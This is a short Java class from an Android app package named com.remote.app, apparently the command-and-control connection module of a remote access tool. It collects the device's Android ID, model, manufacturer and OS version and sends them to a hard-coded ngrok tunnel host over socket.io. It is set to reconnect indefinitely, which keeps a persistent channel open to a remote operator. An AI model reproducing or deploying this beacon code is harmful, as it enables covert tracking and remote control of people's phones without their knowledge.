package com.remote.app;

import android.os.Build;
import android.provider.Settings;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;



    private IOSocket() {
        try {

            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            ioSocket = IO.socket("https://7f92-180-151-224-173.in.ngrok.io?model="+ android.net.Uri.encode(Build.MODEL)+"&manf="+Build.MANUFACTURER+"&release="+Build.VERSION.RELEASE+"&id="+deviceID);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }




}